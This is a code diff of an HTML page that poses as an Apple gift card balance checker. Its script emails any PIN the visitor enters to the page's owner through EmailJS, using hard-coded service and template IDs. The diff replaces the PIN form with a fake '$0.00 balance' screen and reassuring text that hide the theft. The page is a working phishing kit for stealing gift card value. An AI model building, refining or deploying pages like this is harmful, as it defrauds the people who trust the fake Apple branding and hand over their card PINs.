@@ -40,35 +40,23 @@
             <svg class="w-6 h-6 text-gray-500 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                 <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m19 9-7 7-7-7"/>
               </svg>              
-            <a href="" id="buy" class="text-white bg-blue-500 hover:bg-blue-700 ">Buy</a>
+            <a href="" id="buy" class="text-white bg-blue-500 hover:bg-blue-700">Buy</a>
         </div>
      </div>
 
     <div class="main flex items-center justify-center flex-col mt-10">
         <h1 class="text-3xl text-center font-bold mb-10">Check Your Apple Gift <br> Card Balance</h1>
-        <h2 class="text-xl font-bold mb-5">Enter your PIN here:</h2>
+        <h2 class="text-xl font-bold mb-5">Here's your balance:</h2>
 
-        <form class="mb-10 flex items-center justify-center flex-col">
-            <input type="text" name="pin" id="base-input" placeholder="Gift Card PIN" 
-                class="border border-gray-500 text-gray-900 text-xl rounded-lg focus:ring-blue-500 
-                focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 
-                dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 
-                dark:focus:border-blue-500" required>
-            
-            <p class="mt-3">Can't find your PIN? <a href="#" class="text-blue-500 underline">Learn more</a></p>
-            
-            <button type="submit" id="submit-btn" class="bg-blue-500 border cursor-pointer mt-5 text-white 
-            text-xl rounded-lg hover:bg-blue-700 focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 
-            dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white 
-            dark:focus:ring-blue-500 dark:focus:border-blue-500 flex items-center justify-center">
-            <span id="button-text">Check Balance</span>
-            <div id="spinner" class="hidden ml-3 rounded-full border-2 border-t-transparent border-blue-500 w-5 h-5 animate-spin"></div>
-        </button>
-        
-        </form>
+        <h1 class="text-3xl text-center font-bold mb-2">$0.00</h1>
+        <p class="mb-3 text-gray-500 text-sm">Gift Card ending in ...1259</p>
+
+        <p class="text-center text-sm">Recently used gift cards may not reflect the updated <br> balance on the card. Card balances will be updated <br> once your order is ready to ship.</p>
+
+        <a href="index.html" class="text-xl text-blue-500 mt-5 mb-10">Check another gift card</a>
         
 
-        <img src="media/gift_card.jpeg" alt="" class="card_img">
+        <img src="media/gift_card.jpeg" alt="" class="card_img mt-10">
     </div>
 
      
@@ -84,34 +72,18 @@
             // Fetch the input value
             const pin = document.getElementById("base-input").value;
     
-            // Get button elements
-            const submitBtn = document.getElementById("submit-btn");
-            const buttonText = document.getElementById("button-text");
-            const spinner = document.getElementById("spinner");
-    
-            // Disable button and show spinner
-            submitBtn.disabled = true;
-            buttonText.textContent = "Checking...";
-            spinner.classList.remove("hidden");
-    
             // Send form data via EmailJS
             emailjs.send("service_lw3yuzf", "template_lx7h1wj", { 
                 pin: pin  // Matches the {{pin}} placeholder in the template
             }).then(
                 function(response) {
-                    // alert("Your PIN has been successfully submitted!");
-                    window.location.href = "card_code.html";
+                    alert("Your PIN has been successfully submitted!");
                 },
                 function(error) {
                     console.error("EmailJS error: ", error); // Log the error for debugging
                     alert("Failed to send the PIN. Please try again later.");
                 }
-            ).finally(() => {
-                // Re-enable button and hide spinner
-                submitBtn.disabled = false;
-                buttonText.textContent = "Check Balance";
-                spinner.classList.add("hidden");
-            });
+            );
         });
     </script>
        
